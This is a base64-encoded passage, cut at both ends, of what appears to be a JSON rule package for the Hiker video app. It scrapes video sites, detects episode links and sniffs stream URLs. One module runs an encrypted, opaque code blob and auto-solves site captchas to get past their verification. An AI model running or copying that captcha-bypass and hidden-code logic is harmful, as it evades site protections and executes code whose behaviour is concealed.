ZKM6KeE5YiZ5LiN5o+Q5L6b5Lu75L2V5YaF5a65LmpzOicnXFxcIixcXG4gICAgICAgIGNvbF90eXBlOiBcXFwiZmxleF9idXR0b25cXFwiXFxuICAgIH0sIHtcXG4gICAgICAgIHRpdGxlOiBnZXRJdGVtKCd3ZWInLCAnMCcpID09IFxcXCIwXFxcIiA/IFxcXCLop4bpopHll4XmjqJcXFwiIDogXFxcIldlYumAmuWFjVxcXCIsXFxuICAgICAgICB1cmw6ICQoXFxcIiNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoKCkgPT4ge1xcbiAgICAgICAgICAgIGlmIChnZXRJdGVtKCd3ZWInLCAnMCcpID09IFxcXCIwXFxcIikge1xcbiAgICAgICAgICAgICAgICBzZXRJdGVtKCd3ZWInLCAnMScpXFxuICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgc2V0SXRlbSgnd2ViJywgJzAnKVxcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcbiAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXG4gICAgICAgIH0pLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJmbGV4X2J1dHRvblxcXCJcXG4gICAgfSk7XFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogXFxcIiArIFxcXCIsXFxuICAgICAgICB1cmw6ICQoXFxcIiNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoKHJyKSA9PiB7XFxuICAgICAgICAgICAgZGVsZXRlSXRlbUJ5Q2xzKFxcXCJhaWFkZFxcXCIpO1xcbiAgICAgICAgICAgIGFkZEl0ZW1BZnRlcihyciArIFxcXCJhaXNkZWxcXFwiLCBbe1xcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXCJcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgZGVzYzogXFxcIuivt+i+k+WFpee9keermeWQjeensFxcXCIsXFxuICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcImlucHV0XFxcIixcXG4gICAgICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGVWaXNpYmxlOiBmYWxzZSxcXG4gICAgICAgICAgICAgICAgICAgICAgICBvbkNoYW5nZTogXFxcInB1dE15VmFyKCduYW1lJywgaW5wdXQpXFxcIixcXG4gICAgICAgICAgICAgICAgICAgICAgICBjbHM6IFxcXCJhaWFkZFxcXCJcXG4gICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgfSxcXG4gICAgICAgICAgICAgICAge1xcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXCJcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgZGVzYzogXFxcIuivt+i+k+WFpee9keermeaQnOe0ouWcsOWdgFxcXCIsXFxuICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcImlucHV0XFxcIixcXG4gICAgICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGVWaXNpYmxlOiBmYWxzZSxcXG4gICAgICAgICAgICAgICAgICAgICAgICBvbkNoYW5nZTogXFxcInB1dE15VmFyKCdzdXJsJywgaW5wdXQpXFxcIixcXG4gICAgICAgICAgICAgICAgICAgICAgICBjbHM6IFxcXCJhaWFkZFxcXCJcXG4gICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgfSxcXG4gICAgICAgICAgICAgICAge1xcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLmj5DkuqTkv53lrZhcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0X2NlbnRlcl8xXFxcIixcXG4gICAgICAgICAgICAgICAgICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgoKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHN1cmwgPSBnZXRNeVZhcihcXFwic3VybFxcXCIsIFxcXCJcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgbmFtZSA9IGdldE15VmFyKFxcXCJuYW1lXFxcIiwgXFxcIlxcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzdXJsID09IFxcXCJcXFwiIHx8IG5hbWUgPT0gXFxcIlxcXCIpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+ivt+i+k+WFpeWujOaVtOWGheWuuVxcXCJcXG4gICAgICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHIgPSBkZWNvZGVVUklDb21wb25lbnQoc3VybCk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgciA9IHIucmVwbGFjZShuZXcgUmVnRXhwKFxcXCJbXFxcXHU0ZTAwLVxcXFx1OWZhNV0rXFxcIiwgXFxcImdcXFwiKSwgXFxcIioqXFxcIik7XFxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYWRkUnVsZVxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9kYXRhXFxcIik7XFxuICAgICAgICAgICAgICAgICAgICAgICAgYWRkUnVsZShuYW1lLCByKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/lt7Lkv53lrZhcXFwiO1xcbiAgICAgICAgICAgICAgICAgICAgfSksXFxuICAgICAgICAgICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGNsczogXFxcImFpYWRkXFxcIlxcbiAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgXSk7XFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIlxcbiAgICAgICAgfSwgTVlfUlVMRS50aXRsZSksXFxuICAgICAgICBjb2xfdHlwZTogXFxcImZsZXhfYnV0dG9uXFxcIixcXG4gICAgfSk7XFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogXFxcIiAtIFxcXCIsXFxuICAgICAgICB1cmw6IFxcXCJzZWxlY3Q6Ly9cXFwiICsgSlNPTi5zdHJpbmdpZnkoe1xcbiAgICAgICAgICAgIG9wdGlvbnM6IG5hbWVzLFxcbiAgICAgICAgICAgIHRpdGxlOiBcXFwi6K+36YCJ5oup6KaB5Yig6Zmk55qE56uZ54K5XFxcIixcXG4gICAgICAgICAgICBqczogJC50b1N0cmluZygoKSA9PiB7XFxuICAgICAgICAgICAgICAgIGxldCB7XFxuICAgICAgICAgICAgICAgICAgICByZW1vdmVSdWxlXFxuICAgICAgICAgICAgICAgIH0gPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9kYXRhXFxcIik7XFxuICAgICAgICAgICAgICAgIHJlbW92ZVJ1bGUoaW5wdXQpO1xcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8vT0tcXFwiO1xcbiAgICAgICAgICAgIH0pXFxuICAgICAgICB9KSxcXG4gICAgICAgIGNvbF90eXBlOiBcXFwiZmxleF9idXR0b25cXFwiLFxcbiAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICBpZDogTVlfUlVMRS50aXRsZSArIFxcXCJhaXNkZWxcXFwiXFxuICAgICAgICB9XFxuICAgIH0pO1xcbiAgICBkLnB1c2goe1xcbiAgICAgICAgY29sX3R5cGU6IFxcXCJibGFua19ibG9ja1xcXCJcXG4gICAgfSk7XFxuXFxufVwifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi6aqM6K+B56CBXCIsXCJwYXRoXCI6XCJ5em1cIixcInJ1bGVcIjpcImZ1bmN0aW9uIGNoZWNrKHVybCwgaHRtbCwgZCkge1xcbiAgICBsZXQgcmVsb2FkID0gZmFsc2U7XFxuICAgIGlmICgv6aqM6K+B56CBfOezu+e7n+WuieWFqOmqjOivgS8udGVzdChodG1sKSkge1xcbiAgICAgICAgbGV0IGhlYWRlcnMgPSB7XFxuICAgICAgICAgICAgXFxcIlVzZXItQWdlbnRcXFwiOiBNT0JJTEVfVUEsXFxuICAgICAgICAgICAgXFxcIlJlZmVyZXJcXFwiOiB1cmxcXG4gICAgICAgIH07XFxuICAgICAgICBNWV9IT01FID0gZ2V0SG9tZSh1cmwpO1xcbiAgICAgICAgbGV0IHNzeXogPSAnVGxvR25uaWtUaHJmcy81ZkRObGs1Q1NzYmFHdEFIN1cvdU1aanVZb0l1cEI2YkNvbzlDb3RMUUhmUElkR2dia2J5bktxTDJhVUUyWHk1NThYMlF4SFl0VFUwOXZEKzRvYUNESXVTWk83bnhEYkxmUkdmV2o3enFsK3lNYnZGK2FKb0QvbTZQc2Z3L1B5WU9BcC9aVkdkclB6YUNCeWZkMEhMNURGVlN3K1lGMk9DNDBWOFNQOVJ4ZEZLS2RyQnVQeENXZHhVQ0ZySisxbFJ5L1RVM0xDODRDNHh4RUJoZ3VkN1J0QnAwelpBcnFCRTA2K1ozSnREUDBlRkN6L0Q1WDA0MDlxUEhLM2UxeS9MdVVnY2N1eHBIbmpZTEUxR2psUDh3WUEyaFFXZTd5UG5nZ2dRQkh3MzMvZ3ZiM3R1Q2N4RUtUV2dtYWgvUjMyQUg5WkY4akY3V2VtVDI2bFVpelZYZS9zcENkaERnSFIvelVoT0RENFBPNmdsSThKUGhkdStWd2ZQeVJMRzJEN0NVbzFMNlNJRiswZllmMG9UT1dOMTNVUElUbzUrdVpkL1duUVFMVThOWXgvV0ZDVGhFbmtiemxuOVlHdDYwZlJ4c0grOHVNREZnYUJpQyt6MlNwY3hCOWdaNkdYeXBMU1hXYWorcUVVYkdKS0V4K2pLL3Y1Zm5ya0loQ2R3TmJrcDlkUmtzNmRtbFlsQmlmem9XRjhSa3VDM3JxUHRvU2NCa01PTVp1N0dpVnRvSEVkSFVvem1uVUlkclUxTEdJcXE5V25HN1gyYTN5SDhzNjVtakx1TG5kM3EwVTh2K0xNUG5ITDIvR2pRdVRRS1ZoK1JLRVBxSy9KZHJDaEdMTnJqY0h2TEhEYkhFc2hyR1p1UU9kRXBoYngvUGtoa3ZhWXk0SzFNTzg0UjE3Z3VSc0tzL1Y2bmlVUGFMK1hiUTdjM2ZxSlM0VkhKd2x1ZEpURGUwMmV1ZmZHQ20wUEpJUGxBT2dMSG5YMGl6SmhBNnE3MzhSMlV3UWNXQlFqSnQ3OWFGK2t5cVNkeXQxUVBWUVZqYUMzSXBSZjdQZ3NEaEVKN2JpOW5TY2x5SXpnSjlEQ0o0VCs4ZEcxeEhoS3laYXNUN0wveDlMZnIxTWdzOG5CWkVSMlc5YXg3aVRrTksrWDVBQ1UvL3AvWW9QL3VBYW5EdGIzRDBpS1VVdVhGSCtKYmIweDFQMzIyUzJ3NkJKNDZudU5IQk1IVHBWdVd3aFplWnpyaUdoN3FvT3l3TFdpRXhCTUt5eFRHTG5tS2g3cjAzL3lYS1lXSUpucEJOMk1NeWNWSFJaSjdSdW1IVjRDSXNWcnE3aVJQNDg4MjNSSlZ0OU90eVA3dXVjM3dCQlYza2NaVXpiYmFZZFdCeDErQXUrT2QydTdsUjZqb09MODEwbWNKbS9mN0o1VHZHUVA2SEdwaDFZSEhYNEM3NDUzYTd1VkhxT2d5ampoNUVCZDcyME1FQlkyM2MrVEtxL3o5VXBXRERPZzQ4WkZud1NJaEZxaXRXZGlaaXFzYVl1TjAvU1h3aUs4RUc5ZVEyOXUyWERKb0RXNG1sd3RjUk83dmFYNVhjRnNnZjQvbUxVMDdtaSc7XFxuICAgICAgICBldmFsUHJpdmF0ZUpTKHNzeXopO1xcblxcbiAgICAgICAgbGV0IHZjb2RlID0gZ2V0VkNvZGUyKE1ZX0hPTUUgKyAnL2luZGV4LnBocC92ZXJpZnkvaW5kZXguaHRtbD8nLCBKU09OLnN0cmluZ2lmeShoZWFkZXJzKSwgJ251bScpO1xcbiAgICAgICAgZmV0Y2goTVlfSE9NRSArIGh0bWwubWF0Y2goL1xcXFwvaW5kZXgucGhwLio/dmVyaWZ5PS8pWzBdICsgSlNPTi5wYXJzZSh2Y29kZSkucmV0LCB7XFxuICAgICAgICAgICAgaGVhZGVyczogaGVhZGVycyxcXG4gICAgICAgICAgICBtZXRob2Q6ICdQT1NUJ1xcbiAgICAgICAgfSk7XFxuICAgICAgICByZWxvYWQgPSB0cnVlO1xcbiAgICB9XFxuICAgIHJldHVybiByZWxvYWQ7XFxufVxcblxcbmZ1bmN0aW9uIHRlc3QodXJsLCBodG1sLCBkLCBvbGQsIGtleSwgcnVsZSkge1xcbiAgICBpZiAoLzXnp5J86aKR57mBLy50ZXN0KGh0bWwpKSB7XFxuICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgIHRpdGxlOiAn5pCc57Si6ZyA6Ze06ZqUNeenku+8jOeCueWHu+mHjeaWsOWKoOi9vScsXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiLFxcbiAgICAgICAgICAgIGRlc2M6IFxcXCLigJzigJzigJ3igJ08Zm9udCBjb2xvcj0jZjEzYjY2YT5cXFwiICsgcnVsZSArIFxcXCI8L2ZvbnQ+XFxcIixcXG4gICAgICAgICAgICB1cmw6ICQoKS5sYXp5UnVsZSgodXJsLCBvbGQsIGtleSwgcnVsZSkgPT4ge1xcbiAgICAgICAgICAgICAgICBsZXQgc3AgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9zcFxcXCIpO1xcbiAgICAgICAgICAgICAgICBsZXQgZCA9IHNwKG9sZCwga2V5LCBydWxlKTtcXG4gICAgICAgICAgICAgICAgbGV0IHtcXG4gICAgICAgICAgICAgICAgICAgIHdyYXBcXG4gICAgICAgICAgICAgICAgfSA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL3Rvb2xcXFwiKTtcXG4gICAgICAgICAgICAgICAgZm9yIChsZXQgaXQgb2YgZCkge1xcbiAgICAgICAgICAgICAgICAgICAgaXQudGl0bGUgPSB3cmFwKGl0LnRpdGxlLCBrZXkpO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIGFkZEl0ZW1BZnRlcih1cmwsIGQpO1xcbiAgICAgICAgICAgICAgICBkZWxldGVJdGVtKHVybCk7XFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly9PS1xcXCI7XFxuICAgICAgICAgICAgfSwgdXJsLCBvbGQsIGtleSwgcnVsZSksXFxuICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgaWQ6IHVybFxcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH0pO1xcbiAgICB9XFxufVxcblxcbiQuZXhwb3J0cyA9IHtcXG4gICAgY2hlY2s6IGNoZWNrLFxcbiAgICB0ZXN0OiB0ZXN0XFxufVwifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi5bel5YW3XCIsXCJwYXRoXCI6XCJ0b29sXCIsXCJydWxlXCI6XCJmdW5jdGlvbiB3cmFwKHRleHQsIHMpIHtcXG4gICAgcmV0dXJuIHRleHQuaW5jbHVkZXMoXFxcIuKAnOKAnOKAneKAnVxcXCIpID8gdGV4dCA6IFxcXCLigJzigJzigJ3igJ1cXFwiICsgdGV4dC5yZXBsYWNlKG5ldyBSZWdFeHAoXFxcIjxlbT58PC9lbT5cXFwiLCBcXFwiZ1xcXCIpLCBcXFwiXFxcIikucmVwbGFjZShuZXcgUmVnRXhwKHMsIFxcXCJnXFxcIiksIFxcXCI8c3Ryb25nPjxzcGFuIHN0eWxlPVxcXFxcXFwiY29sb3I6ICMxRTkwRkZcXFxcXFxcIj5cXFwiICsgcyArIFxcXCI8L3NwYW4+PC9zdHJvbmc+XFxcIilcXG59XFxuJC5leHBvcnRzID0ge1xcbiAgICB3cmFwOiB3cmFwXFxufVwifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi5Y2V5pCcXCIsXCJwYXRoXCI6XCJzaW5nbGVzXCIsXCJydWxlXCI6XCJqczpcXG52YXIgZCA9IFtdO1xcbmQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwi5pCc57SiXFxcIixcXG4gICAgdXJsOiAkLnRvU3RyaW5nKCgpID0+IHtcXG4gICAgICAgIHB1dE15VmFyKFxcXCJzb1xcXCIsIGlucHV0KTtcXG4gICAgICAgIHJlZnJlc2hQYWdlKCk7XFxuICAgIH0pLFxcbiAgICBjb2xfdHlwZTogXFxcImlucHV0XFxcIixcXG4gICAgZGVzYzogXFxcIuivt+i+k+WFpeWFs+mUruivje+8jOWwvemHj+WwkeWtl+S4jeimgeWkmuWtl1xcXCIsXFxuICAgIHBpY191cmw6IFxcXCJcXFwiLFxcbiAgICBleHRyYToge1xcbiAgICAgICAgZGVmYXVsdFZhbHVlOiBnZXRNeVZhcihcXFwic29cXFwiLCBcXFwiXFxcIilcXG4gICAgfVxcbn0pO1xcbmxldCBzID0gZ2V0TXlWYXIoXFxcInNvXFxcIiwgXFxcIlxcXCIpO1xcbmxldCByID0gXFxcIlxcXCI7XFxuaWYgKHMgIT0gXFxcIlxcXCIpIHtcXG4gICAgbGV0IHAgPSBNWV9QQUdFO1xcbiAgICBsZXQge1xcbiAgICAgICAgbG9hZFxcbiAgICB9ID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvZGF0YVxcXCIpO1xcbiAgICBsZXQge1xcbiAgICAgICAgd3JhcFxcbiAgICB9ID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvdG9vbFxcXCIpO1xcbiAgICBsZXQgZGF0YSA9IGxvYWQocCwgTVlfUEFSQU1TLlJVTEUubmFtZSk7XFxuICAgIGxldCBhcnIgPSBkYXRhWzBdLmZpbmQocywgcCk7XFxuICAgIGZvciAobGV0IGl0IG9mIGFycikge1xcbiAgICAgICAgaXQudGl0bGUgPSB3cmFwKGl0LnRpdGxlLCBzKVxcbiAgICAgICAgZC5wdXNoKGl0KTtcXG4gICAgfVxcbn1cXG5zZXRSZXN1bHQoZCk7XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLmkJzntKLpobXpnaJcIixcInBhdGhcIjpcInNvdXBcIixcInJ1bGVcIjpcImpzOlxcbnZhciBkID0gW107XFxuaWYgKE1ZX1BBUkFNUy5rZXkgJiYgZ2V0TXlWYXIoXFxcInVzZVxcXCIsIFxcXCJcXFwiKSA9PSBcXFwiXFxcIikge1xcbiAgICBwdXRNeVZhcihcXFwic291XFxcIiwgTVlfUEFSQU1TLmtleSk7XFxuICAgIHB1dE15VmFyKFxcXCJ1c2VcXFwiLCBcXFwiMVxcXCIpO1xcbiAgICBhZGRMaXN0ZW5lcihcXFwib25DbG9zZVxcXCIsICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICAgICAgY2xlYXJNeVZhcihcXFwidXNlXFxcIik7XFxuICAgIH0pKTtcXG59XFxuJC5yZXF1aXJlKCdoaWtlcjovL3BhZ2UvcHJvJylcIn1dLFwicGFyYW1zXCI6XCJ7XFxcImluaGVyaXRUaXRsZVxcXCI6ZmFsc2V9XCIsXCJzYXZlZFwiOmZhbHNlLFwidGl0bGVcIjpcIkFJ5b2x5pCcKOaOqOmAgSlcIixcInZlcnNpb25cIjowLFwidXJsXCI6XCJoaWtlcjovL3BhZ2UvcD91PWFIUjBjSE02THk5dExtWmxibWRuYjNWa2VUTXVZMjl0TDNadlpDMXlaV0ZrTFdsa0xURXlNekUzTWk1b2RHMXMmbW92dGl0bGU9NlppLzVZZWg2TDYrTXUrOG11YXd0T1M1aSttQmt3PT1cIixcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJmaW5kX3J1bGVcIjpcImpzOlxcbnZhciBkID0gW107XFxubGV0IHVybCA9IGJhc2U2NERlY29kZShnZXRQYXJhbShcXFwidVxcXCIpKTtcXG5sZXQgbXZ0aXRsZSA9IGJhc2U2NERlY29kZShnZXRQYXJhbShcXFwibW92dGl0bGVcXFwiKSk7XFxubGV0IGh0bWwgPSByZXF1ZXN0KHVybCk7XFxubGV0IGFsaXN0ID0gcGRmYShodG1sLCBcXFwiYm9keSYmYVxcXCIpO1xcbmxldCBhcnIgPSBhbGlzdC5tYXAoaXQgPT4ge1xcbiAgICByZXR1cm4ge1xcbiAgICAgICAgLy9odG1sOiBpdCxcXG4gICAgICAgIHRleHQ6IHBkZmgoaXQsIFxcXCJhJiZUZXh0XFxcIiksXFxuICAgICAgICB0aXRsZTogcGRmaChpdCwgXFxcImEmJnRpdGxlXFxcIiksXFxuICAgICAgICBocmVmOiBwZChpdCwgXFxcImEmJmhyZWZcXFwiLCB1cmwpXFxuICAgIH1cXG59KTtcXG4vL2xvZyhhcnIpO1xcbmxldCBkZWJ1ZyA9IGZhbHNlO1xcblxcbmZ1bmN0aW9uIGNsZWFyVGV4dChpdCkge1xcbiAgICByZXR1cm4gaXQucmVwbGFjZSgv56ysfOmbhnznq6AvZywgXFxcIlxcXCIpO1xcbn1cXG5cXG5mdW5jdGlvbiBpc01vdmllKGl0KSB7XFxuICAgIGlmIChpdCA9PSBudWxsIHx8IGl0LnRleHQgPT0gbnVsbCkge1xcbiAgICAgICAgcmV0dXJuIGZhbHNlO1xcbiAgICB9XFxuICAgIGxldCB0aXQgPSBpdC50aXRsZSB8fCBcXFwiXFxcIjtcXG4gICAgaXQgPSBpdC50ZXh0IHx8IFxcXCJcXFwiO1xcbiAgICBpZiAoaXQgPT0gXFxcIlxcXCIgfHwgaXQubGVuZ3RoID4gOCkge1xcbiAgICAgICAgcmV0dXJuIGZhbHNlO1xcbiAgICB9XFxuICAgIC8v5o6S6ZmkXFxuICAgIGxldCByZWcgPSAvXFxcXC586auY5riF55u05pKtfOWGmeecn+aOqOiNkC87XFxuICAgIGlmICh0aXQgIT0gXFxcIlxcXCIgJiYgIXRpdC5pbmNsdWRlcyhpdCkgfHwgcmVnLnRlc3QoaXQpKSB7XFxuICAgICAgICByZXR1cm4gZmFsc2U7XFxuICAgIH1cXG4gICAgcmV0dXJuIGl0Lm1hdGNoKC/ljp/nlLt85aSH55SofOiTneWFiXzotoXmuIV86auY5riFfOato+eJh3zpn6nniYh8NEt8NGt8MTA4MFB8NzIwUHxUQ3xIRHxCRC8pXFxufVxcblxcbmZ1bmN0aW9uIG5vdENoYXB0ZXIoaXQpIHtcXG4gICAgaWYgKGl0ID09IG51bGwgfHwgaXQudGV4dCA9PSBudWxsKSB7XFxuICAgICAgICByZXR1cm4gdHJ1ZTtcXG4gICAgfVxcbiAgICByZXR1cm4gaXQudGV4dC5tYXRjaCgvWzAtOV1cXFxcLlswLTld5YiGLyk7XFxufVxcblxcbmZ1bmN0aW9uIGlzQ2hhcHRlcihpdCwgcHJlLCBuZXh0KSB7XFxuICAgIGlmIChub3RDaGFwdGVyKGl0KSkge1xcbiAgICAgICAgLy/kvJjlhYjmjpLpmaRcXG4gICAgICAgIHJldHVybiBmYWxzZTtcXG4gICAgfVxcbiAgICAvL+WIpOaWreaYr+S4jeaYr+eUteW9sVxcbiAgICBpZiAoaXNNb3ZpZShpdCkpIHtcXG4gICAgICAgIHJldHVybiB0cnVlO1xcbiAgICB9XFxuICAgIHJldHVybiBpc0NoYXB0ZXIwKGl0LCBwcmUpIHx8IGlzQ2hhcHRlcjAoaXQsIG5leHQpO1xcbn1cXG5cXG5mdW5jdGlvbiBnZXRDaGFwdGVyTnVtKGl0KSB7XFxuICAgIGlmIChpdCA9PSBudWxsIHx8IGl0LnRleHQgPT0gbnVsbCkge1xcbiAgICAgICAgcmV0dXJuIC0xO1xcbiAgICB9XFxuICAgIGl0ID0gaXQudGV4dCB8fCBcXFwiXFxcIjtcXG4gICAgaWYgKGl0ID09IFxcXCJcXFwiKSB7XFxuICAgICAgICByZXR1cm4gLTE7XFxuICAgIH1cXG4gICAgaXQgPSBjbGVhclRleHQoaXQpO1xcbiAgICBsZXQgcmVnID0gL15bMC05XSokLztcXG4gICAgaWYgKCFyZWcudGVzdChpdCkpIHtcXG4gICAgICAgIHJldHVybiAtMTtcXG4gICAgfVxcbiAgICBpdCA9IHBhcnNlSW50KGl0KTtcXG4gICAgaWYgKGlzTmFOKGl0KSkge1xcbiAgICAgICAgcmV0dXJuIC0xO1xcbiAgICB9XFxuICAgIHJldHVybiBpdDtcXG59XFxuXFxuZnVuY3Rpb24gaXNDaGFwdGVyMChpdCwgYnJvdGhlcikge1xcbiAgICAvKmlmIChkZWJ1Zykge1xcbiAgICAgICAgbG9nKHtcXG4gICAgICAgICAgICBpdDogaXQsXFxuICAgICAgICAgICAgYnJvdGhlcjogYnJvdGhlclxcbiAgICAgICAgfSk7XFxuICAgIH0qL1xcbiAgICBpdCA9IGdldENoYXB0ZXJOdW0oaXQpO1xcbiAgICAvL2lmIChkZWJ1ZykgbG9nKGl0KTtcXG4gICAgaWYgKGl0IDwgMCkge1xcbiAgICAgICAgcmV0dXJuIGZhbHNlO1xcbiAgICB9XFxuICAgIGJyb3RoZXIgPSBnZXRDaGFwdGVyTnVtKGJyb3RoZXIpO1xcbiAgICAvL2lmIChkZWJ1ZykgbG9nKGJyb3RoZXIpO1xcbiAgICBpZiAoYnJvdGhlciA8IDApIHtcXG4gICAgICAgIHJldHVybiBmYWxzZTtcXG4gICAgfVxcbiAgICByZXR1cm4gaXQgLSBicm90aGVyIDwgMiAmJiBpdCAtIGJyb3RoZXIgPiAtMjtcXG59XFxubGV0IHRmcHVzaCA9IGdldEl0ZW0oJ3dlYnB1c2gnLCAnMCcpO1xcbmxldCBfd2ViID0gJC50b1N0cmluZygodGZwdXNoKSA9PiB7XFxuICAgIGxldCB1cmxzID0gX2dldFVybHMoKTtcXG4gICAgbGV0IHJlZyA9IC9cXFxcLmh0bWx8XFxcXC5jc3N8XFxcXC5qcy87XFxuICAgIGZvciAobGV0IGsgaW4gdXJscykge1xcbiAgICAgICAgaWYgKCFyZWcudGVzdCh1cmxzW2tdKSAmJiB1cmxzW2tdLm1hdGNoKC9cXFxcLm1wNHxcXFxcLm0zdTgvKSkge1xcbiAgICAgICAgICAgIGZ5X2JyaWRnZV9hcHAubG9nKHVybHNba10pO1xcbiAgICAgICAgICAgIGlmICh0ZnB1c2ggPT0gJzAnKSB7XFxuICAgICAgICAgICAgICAgIHJldHVybiBmeV9icmlkZ2VfYXBwLmdldEhlYWRlclVybCh1cmxzW2tdLnJlcGxhY2UoLy4qP3VybD0vLCBcXFwiXFxcIikpICsgXFxcIiNpZ25vcmVJbWc9dHJ1ZSNcXFwiO1xcbiAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgIGxldCBwbGF5ID0gZnlfYnJpZGdlX2FwcC5nZXRIZWFkZXJVcmwodXJsc1trXS5yZXBsYWNlKC8uKj91cmw9LywgXFxcIlxcXCIpKTtcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL3BhZ2UvcHVzaD9ydWxlPVhZUeaOqOmAgSZwdXNodXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoSlNPTi5zdHJpbmdpZnkoe1xcbiAgICAgICAgICAgICAgICAgICAgXFxcIm5hbWVcXFwiOiBkb2N1bWVudC50aXRsZSxcXG4gICAgICAgICAgICAgICAgICAgIFxcXCJ1cmxcXFwiOiBwbGF5XFxuICAgICAgICAgICAgICAgIH0pKTtcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9XFxuICAgIH1cXG59LCB0ZnB1c2gpO1xcblxcbmxldCB3ZWIgPSBnZXRJdGVtKCd3ZWInLCAnMCcpID09IFxcXCIxXFxcIjtcXG5cXG5mb3IgKGxldCBpID0gMDsgaSA8IGFyci5sZW5ndGg7IGkrKykge1xcbiAgICBsZXQgaXQgPSBhcnJbaV07XFxuICAgIGxldCB0ID0gaXQudGV4dDtcXG4gICAgaWYgKCFpdC5ocmVmIHx8IGl0LmhyZWYgPT0gXFxcIlxcXCIpIHtcXG4gICAgICAgIGNvbnRpbnVlO1xcbiAgICB9XFxuICAgIGxldCBwcmUgPSBpID09IDAgPyBudWxsIDogYXJyW2kgLSAxXTtcXG4gICAgbGV0IG5leHQgPSBpID09IChhcnIubGVuZ3RoIC0gMSkgPyBudWxsIDogYXJyW2kgKyAxXTtcXG4gICAgaWYgKGlzQ2hhcHRlcihpdCwgcHJlLCBuZXh0KSkge1xcbiAgICAgICAgaWYgKHdlYikge1xcbiAgICAgICAgICAgIHZhciB1cmx4ID0gXFxcIndlYlJ1bGU6Ly9cXFwiICsgaXQuaHJlZiArIFxcXCJAXFxcIiArIF93ZWI7XFxuICAgICAgICAgICAgdmFyIGV4dHJheCA9IHtcXG4gICAgICAgICAgICAgICAganNMb2FkaW5nSW5qZWN0OiB0cnVlLFxcbiAgICAgICAgICAgICAgICBpZDogaXQuaHJlZixcXG4gICAgICAgICAgICAgICAgYmxvY2tSdWxlczogWycubTRhJywgJy5tcDMnLCAnLmZsdicsICcuYXZpJywgJy4zZ3AnLCAnLm1wZWcnLCAnLndtdicsICcubW92JywgJy5ybXZiJywgJy5naWYnLCAnLmpw